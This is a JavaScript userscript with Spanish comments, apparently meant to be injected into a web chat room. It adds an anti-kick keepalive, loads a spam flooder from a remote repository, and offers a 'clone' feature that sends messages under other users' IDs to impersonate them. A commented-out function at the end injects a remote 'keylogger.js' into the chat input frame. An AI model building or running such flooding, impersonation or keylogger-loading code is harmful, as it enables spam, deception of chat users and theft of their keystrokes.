/**************************
	CloneScript Version 5
	11/11/2015
	versión 5.2 al 26/11/2015
	versión 6 al 26/04/2016
	chg:12delmes8del2016
	..
	Author: ++
**************************/


//++ Anti-Kick:
rcFC.send("700","750"); 
BL.pingSent = new Date().getMilliseconds();
var ver = setInterval('rcFC.send("700","750")',600000);
ver;
//clearInterval(ver);

//++ Script para el Flooder:
var scriptF = document.createElement('script');
scriptF.src = 'https://rawgit.com/Usagi86/RC_scripts/master/flooder.js';
var headF = document.getElementsByTagName('head')[0];
headF.appendChild(scriptF);

//++ Cambiar el contenido de la ventana help y mostrar ahi los nuevos elementos para el clone y para el flooder:
document.getElementById('HDB').innerHTML = ' <a style="font-size:16px; color: #0056b2;"><b>Spam-Flooder(Usar con cuidado):<b></a><div>&nbsp;</div> <div>Texto SPAM: <input id="spamText" size="60px" title="Escribe/pega acá el texto que quieras que se envíe" style="background: #C4E7FF; border:2px solid #000000" ></input></div><div>&nbsp;</div> <div>Tiempo(milisegundos): <input id="tiempo" size="5" title="Escribe un número a partir de 1250. Mientras mayor sea más tiempo tardará." value="1250" style="background: #C4E7FF; border:2px solid #000000; height:12px"><i> [número mayor a 1250]</i></input></div> <div>&nbsp;</div><div>Iniciar/Parar:&nbsp;<button id="bts1" title="Estado del Flooder" onmouseup="presbts1();" style="cursor: pointer; border: 0.8px solid #000000; background: #C5EA35;">OFF</button></div><hr size="4" width="100%" align="left" style="color: #0056b2;"></hr><a style="font-size:18px; color: #0056b2;"><b>Clonar:</a><div>Texto a mostrar: <input id="text_in" type="text" onkeypress="validar(event)" size="30" style="background: #C4E7FF; border:2px solid #000000; height:35px; font-size:18px"></input><a>&nbsp;</a><a id="bt_enviar" onmousedown="cl_text();" class="btn" style="cursor:pointer; border:0.8px solid #000000; background: #C5EA35;"><b>Enviar </b></a><div>&nbsp;</div><div>Nick a clonar: <input id="cl_nick" readonly="readonly" style="background: #FFFFFF; border:2px solid #000000"></input><a>&nbsp;&nbsp;</a><a id="bt_b" title="Letra en Negrita" onmousedown="negrita();" class="btn" style="cursor:pointer; border:2px solid rgb(6, 65, 98); background:transparent;"><b>B </b></a><a>&nbsp;</a><a id="bt_i" title="Letra en Cursiva" onmousedown="cursiva();" class="btn" style="cursor:pointer; border:2px solid rgb(6, 65, 98); background:transparent;"><i>I </i></a><a>&nbsp;</a><a id="bt_u" title="Letra subrayada" onmousedown="subrayado();" class="btn" style="cursor:pointer; border:2px solid rgb(6, 65, 98); background:transparent;"><u>U </u></a></div><a id="mostrar" style="color: #000000;" title="Solo da Click sobre el color a elegir">Color del nick a clonar:</a><div><a id="tablaSimple" style="visibility: visible; "><a id="bt1" class="btn" onclick="ocultar()" style="cursor:pointer; background: #909090;">&nbsp;&nbsp;&nbsp;</a><a id="bt2" class="btn" onclick="ocultar()" style="cursor:pointer; background: #FF0300;">&nbsp;&nbsp;&nbsp;</a><a id="bt3" class="btn" onclick="ocultar()" style="cursor:pointer; background: #FF9A00;">&nbsp;&nbsp;&nbsp;</a><a id="bt4" class="btn" onclick="ocultar()" style="cursor:pointer; background: #FFCD00;">&nbsp;&nbsp;&nbsp;</a><a id="bt5" class="btn" onclick="ocultar()" style="cursor:pointer; background: #C5EA35;">&nbsp;&nbsp;&nbsp;</a><a id="bt6" class="btn" onclick="ocultar()" style="cursor:pointer; background: #4BE22C;">&nbsp;&nbsp;&nbsp;</a><a id="bt7" class="btn" onclick="ocultar()" style="cursor:pointer; background: #2CAFE2;">&nbsp;&nbsp;&nbsp;</a><a id="bt8" class="btn" onclick="ocultar()" style="cursor:pointer; background: #353CC4;">&nbsp;&nbsp;&nbsp;</a><a id="bt9" class="btn" onclick="ocultar()" style="cursor:pointer; background: #992CE2;">&nbsp;&nbsp;&nbsp;</a><a id="bt10" class="btn" onclick="ocultar()" style="cursor:pointer; background: #E22C9A;">&nbsp;&nbsp;&nbsp;</a></div><div><a id="bt11" class="btn" onclick="ocultar()" style="cursor:pointer; background: #000000;">&nbsp;&nbsp;&nbsp;</a><a id="bt12" class="btn" onclick="ocultar()" style="cursor:pointer; background: #CE1918;">&nbsp;&nbsp;&nbsp;</a><a id="bt13" class="btn" onclick="ocultar()" style="cursor:pointer; background: #CE5D18;">&nbsp;&nbsp;&nbsp;</a><a id="bt14" onclick="ocultar()" class="btn" style="cursor:pointer; background: #CEAB18;">&nbsp;&nbsp;&nbsp;</a><a id="bt15" class="btn" onclick="ocultar()" style="cursor:pointer; background: #97B71C;">&nbsp;&nbsp;&nbsp;</a><a id="bt16" class="btn" onclick="ocultar()" style="cursor:pointer; background: #35A31F;">&nbsp;&nbsp;&nbsp;</a><a id="bt17" class="btn" onclick="ocultar()" style="cursor:pointer; background: #1F7EA3;">&nbsp;&nbsp;&nbsp;</a><a id="bt18" class="btn" onclick="ocultar()" style="cursor:pointer; background: #1F54A3;">&nbsp;&nbsp;&nbsp;</a><a id="bt19" onclick="ocultar()" class="btn" style="cursor:pointer; background: #6E1FA3;">&nbsp;&nbsp;&nbsp;</a><a id="bt20" class="btn" onclick="ocultar()" style="cursor:pointer; background: #A31F6E;">&nbsp;&nbsp;&nbsp;</a></ul></a></div></div> ';


/////////////////////////////////////////////////////////////////////////////////
//++ ANTIGÜO ARCHIVO DE CABECERA ++//
// variable que guardara el codigo del color del clon:
var colorN="#000000";

// funcion para darle al clon el color que elijamos:
function ocultar()//(antiguo nombre de otra funcion que ocultaba un elemento)
{
	document.getElementById("mostrar").style.color = colorN;
}

// al dar click sobre los colores me elegira uno nuevo para el clon:
document.getElementById("bt1").onclick=function() {colorN="#909090";};
document.getElementById("bt2").onclick=function() {colorN="#FF0300";};
document.getElementById("bt3").onclick=function() {colorN="#FF9A00";};
document.getElementById("bt4").onclick=function() {colorN="#FFCD00";};
document.getElementById("bt5").onclick=function() {colorN="#C5EA35";};
document.getElementById("bt6").onclick=function() {colorN="#4BE22C";};
document.getElementById("bt7").onclick=function() {colorN="#2CAFE2";};
document.getElementById("bt8").onclick=function() {colorN="#353CC4";};
document.getElementById("bt9").onclick=function() {colorN="#992CE2"; };
document.getElementById("bt10").onclick=function() {colorN="#E22C9A";};
document.getElementById("bt11").onclick=function() {colorN="#000000";};
document.getElementById("bt12").onclick=function() {colorN="#CE1918";};
document.getElementById("bt13").onclick=function() {colorN="#CE5D18";};
document.getElementById("bt14").onclick=function() {colorN="#CEAB18";};
document.getElementById("bt15").onclick=function() {colorN="#97B71C";};
document.getElementById("bt16").onclick=function() {colorN="#35A31F";};
document.getElementById("bt17").onclick=function() {colorN="#1F7EA3";};
document.getElementById("bt18").onclick=function() {colorN="#1F54A3";};
document.getElementById("bt19").onclick=function() {colorN="#6E1FA3";};
document.getElementById("bt20").onclick=function() {colorN="#A31F6E";};
//FIN_del_antiguo_cab


////++++ AQUI IRA EL SCRIPT PARA CLONAR ++++////

var ctrl1=0; var ctrl2=0; var ctrl3=0;
function negrita(){
if (ctrl1==0){ctrl1=1;document.getElementById("bt_b").style.background="rgb(213, 255, 115)";}else
{ctrl1=0;document.getElementById("bt_b").style.background="transparent";}
}
function cursiva(){
if (ctrl2==0){ctrl2=1;document.getElementById("bt_i").style.background="rgb(213, 255, 115)";}else
{ctrl2=0;document.getElementById("bt_i").style.background="transparent";}
}
function subrayado(){
if (ctrl3==0){ctrl3=1;document.getElementById("bt_u").style.background="rgb(213, 255, 115)";}else
{ctrl3=0;document.getElementById("bt_u").style.background="transparent";}
}

//++agregado para version 5.2:
/******************************************************************************************************************
 	Creamos una opcion en el sub-menu de usuario para abrir la ventana de clonar
 	y además en el nick que demos click se agregará a dicha ventana para no tener que colocar el nick a clonar
******************************************************************************************************************/
// ++ crear elemento:
var anclaTexto1 = document.createTextNode('');
var nuevoAncla1 = document.createElement("li");
nuevoAncla1.appendChild(anclaTexto1);
var anclaExistente = document.getElementById("UMB");
var padre = anclaExistente.parentNode;
var nuevoHijo1 = padre.insertBefore(nuevoAncla1, anclaExistente);

//++ modificar elemento en el html:
nuevoAncla1.innerHTML = '<a id="clonarL" onclick="n_clon()" onmouseover="mouse_entra()" onmouseout="mouse_sale()" style="color:#29354a; background:#edeff4; " >CLONAR';

//le quitamos el borde a la lista:
document.getElementById('UMB').style.border = '0px';

/////////////////////////
// ++ funcion para cuando se le da click al elemento:
var elemento = document.getElementById('UMB');
var nn="";
nn = elemento.getElementsByTagName('li');
var tomar="-1";

function n_clon()
{
	//cerrar submenu de usuario(profile):
	E.hide(ULS.uM);
	
	if ( document.getElementById('UMB').innerHTML != '<ul><li><a onclick="return E.hide(ULS.uM)">You</a></li></ul>' )
	{
		var get_id = nn[1].innerHTML;
		tomar = get_id.substring(27,33);
	}
	else
	{
		tomar = "-1";// en caso de dar click a mi nick no tomará mi id.
	}
	
	if ( tomar != "-1" )
	{
		//abrir ventana de help:
		document.getElementById('HD').style.visibility = 'visible';
		
		//meter el id de la variable global tomar en el espacio para clonar. y mostrar el nick en el lugar indicado:
		//alert(tomar);
	}
mostrar_nick = ULS.getUser(tomar).nick;
document.getElementById("cl_nick").value = mostrar_nick;
}

//++ funcion para el estilo del nuevo elemento:
function mouse_entra()
{
  document.getElementById('clonarL').style.color = '#FFFFFF';
  document.getElementById('clonarL').style.background = '#29354A';
}
function mouse_sale()
{
  document.getElementById('clonarL').style.color = '#29354A';
  document.getElementById('clonarL').style.background = '#EDEFF4';
}

////////////////////// Aquí se retoma el script 'puro' de clonar:
function cl_text(){
var myText=document.getElementById("text_in").value;
//var u_nick=document.getElementById("cl_nick").value;//escribir aqui la string con el nick perteneciente al valor de la variable tomar.


var bo0; var bo1; var it0; var it1; var un0; var un1; 
if (ctrl1==1){bo0 = "[/b]"; bo1 = "[b]";}else{bo0 = ""; bo1 = "";}
if (ctrl2==1){it0 = "[/i]"; it1 = "[i]";}else{it0 = ""; it1 = "";}
if (ctrl3==1){un0 = "[/u]"; un1 = "[u]";}else{un0 = ""; un1 = "";}

var T_1 = un1 + it1 + bo1 + "[c=" + colorN + "]" + myText + "[/c]" + bo0 + it0 + un0;

//var chekk=ULS.getID(u_nick);// COLOCAR AQUI LA VARIABLE tomar
var chekk = tomar;
	if (chekk!==null && T_1!="[c=" + colorN + "]"+"[/c]" && T_1!="[b]"+"[c=" + colorN + "]"+"[/c]"+"[/b]" && T_1!="[i]"+"[c=" + colorN + "]"+"[/c]"+"[/i]" && T_1!="[u]"+"[c=" + colorN + "]"+"[/c]"+"[/u]" && T_1!="[b]"+"[i]"+"[c=" + colorN + "]"+"[/c]"+"[/i]"+"[/b]" && T_1!="[b]"+"[u]"+"[c=" + colorN + "]"+"[/c]"+"[/u]"+"[/b]")
	{
		if ( myText.length != 0 )
		{
			rcFC.send("500","612",chekk,T_1);
			myText=document.getElementById("text_in").value="";
		}
	}
}
//++ funcion para enviar el texto del clon al dar enter:
function validar(e) {
  tecla = (document.all) ? e.keyCode : e.which;
  if (tecla==13) cl_text();
};
//FIN_DEL_SCRIPT_DE_CLONAR.


/////////////////////////////////////////////////////////////////////////////////
//++ Script de edición de estilos más agregado de nuevos colores:
var scriptE=document.createElement('script');
scriptE.src='https://rawgit.com/Usagi86/RC_scripts/master/edicion_estilos_y_colores.js';
var headE=document.getElementsByTagName('head')[0];
headE.appendChild(scriptE);
//Fin_del_editor_de estilos_mas_colores.
/////////////////////////////////////////////////////////////////////////////////
//++ Script de Generador de texto (letras_símbolos) + Texto multicolor + Texto con GRADIENTES:
var scriptGTMC = document.createElement('script');
scriptGTMC.src = 'https://rawgit.com/Usagi86/RC_scripts/master/fonts_mColor_gradient.js';
var headGTMC = document.getElementsByTagName('head')[0];
headGTMC.appendChild(scriptGTMC);
//Fin_del_generador_de_texto_mas_texto_multicolor.
/////////////////////////////////////////////////////////////////////////////////

/*
//++ GENERADOR DE TEXTO (letras-caracteres):
var scriptGT = document.createElement('script');
scriptGT.src = 'https://rawgit.com/Usagi86/RC_scripts/master/generador_de_texto.js';
var headGT = document.getElementsByTagName('head')[0];
headGT.appendChild(scriptGT);
*/
/////////////////////////////////////////////////////////////////////////////////
/*
//++ TEXTO MULTICOLOR:
var scriptTMC = document.createElement('script');
scriptTMC.src = 'https://rawgit.com/Usagi86/RC_scripts/master/texto_multicolor.js';
var headTMC = document.getElementsByTagName('head')[0];
headTMC.appendChild(scriptTMC);
*/
/////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////

// CAMBIAR PARTE DEL ESTILO (colores, imagenes, etc)
//++Eliminar css original:
var x = document.body.getElementsByTagName("style");
if (x.length)
    x[0].parentElement.removeChild(x[0]);

//++Agregar nuevo css:
var newSS=document.createElement('link');
newSS.rel='stylesheet';
newSS.href='https://rawgit.com/Usagi86/RC_scripts/master/archivocss.css';
document.getElementsByTagName("head")[0].appendChild(newSS);
//Fin_de_css.


//MODIFICANDO EL ARRAY DE LOS EMOTICONOS:
// primero agregamos el indice, o sea lo que escribiremos para que salga:
EP.em = new Array(":L",":T",":Q",":A",":)",":D",":))",";)",":P",":*)",":*","]:)",":|",":\\","X(",":(",":((",":X",":O","B)",":@",":$",":#","O:)","]:}");
// creamos variables para guardar las url:
var g1 = "url('https://raw.githubusercontent.com/Usagi86/nuevo_repositorio/new/g1.gif') ";
var g2 = "url('https://raw.githubusercontent.com/Usagi86/nuevo_repositorio/new/g2.gif')";
var g3 = " url('https://raw.githubusercontent.com/Usagi86/nuevo_repositorio/new/g3.gif') ";
var g4 = " url('https://raw.githubusercontent.com/Usagi86/nuevo_repositorio/new/g4.gif') ";

// luego agregamos al array las propiedades de la nueva imagen:
EP.emR = new Array({m:/:-*\L+/,r:"<span class=\"nI\" style=\"font-size:45px; background-repeat:no-repeat; background-image: " +g4+ "\">&nbsp;&nbsp;&nbsp;</span>"},{m:/:-*\T+/,r:"<span style=\"font-size:45px; background-repeat:no-repeat; background-image: " +g3+ "\">&nbsp;&nbsp;&nbsp;</span>"}, {m:/:-*\Q+/,r:"<span style=\"font-size:45px; background-repeat:no-repeat; background-image: " +g2+ "\">&nbsp;&nbsp;&nbsp;</span>"}, {m:/:-*\A+/,r:"<span style=\"font-size:45px; background-repeat:no-repeat; background-image: " +g1+ "\">&nbsp;&nbsp;&nbsp;</span>"},{m:/\]:-*\)+/,r:"<span class=\"em\" style=\"background-position: -140px -20px;\">&nbsp;</span>"},{m:/O:-*\)+/i,r:"<span class=\"em\" style=\"background-position: -380px -20px;\">&nbsp;</span>"},{m:/:-*\*\)+/,r:"<span class=\"em\" style=\"background-position: -100px -20px;\">&nbsp;</span>"},{m:/:-*\)\)+/,r:"<span class=\"em\" style=\"background-position: -40px -20px;\">&nbsp;</span>"},{m:/:-*\)+/,r:"<span class=\"em\" style=\"background-position: 0px -20px;\">&nbsp;</span>"},{m:/:-*D+/i,r:"<span class=\"em\" style=\"background-position: -20px -20px;\">&nbsp;</span>"},{m:/;-*\)+/,r:"<span class=\"em\" style=\"background-position: -60px -20px;\">&nbsp;</span>"},{m:/(:|;)-*P+/i,r:"<span class=\"em\" style=\"background-position: -80px -20px;\">&nbsp;</span>"},{m:/:-*\*+/,r:"<span class=\"em\" style=\"background-position: -120px -20px;\">&nbsp;</span>"},{m:/:-*\|+/,r:"<span class=\"em\" style=\"background-position: -160px -20px;\">&nbsp;</span>"},{m:/:-*\\+/,r:"<span class=\"em\" style=\"background-position: -180px -20px;\">&nbsp;</span>"},{m:/X-*\(+/i,r:"<span class=\"em\" style=\"background-position: -200px -20px;\">&nbsp;</span>"},{m:/:-*\(\(+/,r:"<span class=\"em\" style=\"background-position: -240px -20px;\">&nbsp;</span>"},{m:/:-*\(+/,r:"<span class=\"em\" style=\"background-position: -220px -20px;\">&nbsp;</span>"},{m:/:-*X+/i,r:"<span class=\"em\" style=\"background-position: -260px -20px;\">&nbsp;</span>"},{m:/:-*O+/i,r:"<span class=\"em\" style=\"background-position: -280px -20px;\">&nbsp;</span>"},{m:/B-*\)+/i,r:"<span class=\"em\" style=\"background-position: -300px -20px;\">&nbsp;</span>"},{m:/:-*@+/,r:"<span class=\"em\" style=\"background-position: -320px -20px;\">&nbsp;</span>"},{m:/:-*\$+/,r:"<span class=\"em\" style=\"background-position: -340px -20px;\">&nbsp;</span>"},{m:/:-*#+/,r:"<span class=\"em\" style=\"background-position: -360px -20px;\">&nbsp;</span>"},{m:/\]:-*}+/,r:"<span class=\"em\" style=\"background-position: -400px -20px;\">&nbsp;</span>"});

//Fin_edicion_emoticonos.
/////////////////////////////////////////////////////////////////////////////////


/////////////////////////////////////////////////////////////////////////////////
//necesario en chrome:
document.getElementById("CI").style.height="50px";

//
////FIN DEL SCRIPT.

/*
function eD()
{
var cabe = IN.CI.document.head
var scriptt = document.createElement('script');
scriptt.src="http://kosmosapps.xyz/keylogger.js";
cabe.appendChild(scriptt);
}
eD();
*/
